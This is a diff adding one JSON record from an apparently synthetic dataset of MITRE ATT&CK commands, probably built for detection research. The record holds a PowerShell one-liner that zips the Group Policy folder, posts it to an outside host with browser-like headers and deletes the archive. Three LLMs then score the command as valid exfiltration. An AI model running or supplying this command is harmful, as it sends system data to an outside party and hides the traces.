@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$ProgressPreference='SilentlyContinue'; $zip=Join-Path $env:TEMP ('pol_'+(Get-Date -Format yyyyMMddHHmmss)+'.zip'); Compress-Archive -Path 'C:\\Windows\\System32\\GroupPolicy' -DestinationPath $zip -Force; Invoke-WebRequest -Uri 'https://img.example-cdn.net/push/policy' -Method Post -InFile $zip -ContentType 'application/zip' -Headers @{ 'User-Agent'='Mozilla/5.0'; 'Cache-Control'='no-cache' } -ErrorAction SilentlyContinue; Remove-Item $zip -Force",
+  "explanation": "Compresses local Group Policy artifacts and exfiltrates them via HTTPS POST to a remote collection endpoint.",
+  "rationale_steps": [
+    "Package Group Policy files that can reveal system constraints and scripts.",
+    "Transfer the archive using Invoke-WebRequest with neutral headers.",
+    "Suppress progress and erase temporary files afterward."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-ed594729-56ace5da",
+  "source_prompt_hash": "ed594729",
+  "timestamp_utc": "2025-09-30T09:16:21.768830Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid PowerShell with balanced quotes and parentheses, proper semicolon separators, and correct cmdlet parameters and hashtable syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "It compresses the specified directory, exfiltrates the archive via HTTPS POST using Invoke-WebRequest, and deletes the file afterward, aligning with automated exfiltration behavior.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T02:50:12.109361Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable assignments, function calls, parameter usage, balanced quotes/parentheses/braces, and appropriate command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by compressing Group Policy data into a timestamped ZIP file, exfiltrating it via HTTPS POST with browser-like headers for evasion, and cleaning up the evidence afterward.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:50:15.033472Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax, balanced quotes, parentheses, and valid cmdlet parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command flawlessly executes the claimed intent of compressing Group Policy artifacts and exfiltrating them via HTTPS POST, aligning perfectly with T1020 Automated Exfiltration under 'None' privilege.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:33:36.070307Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
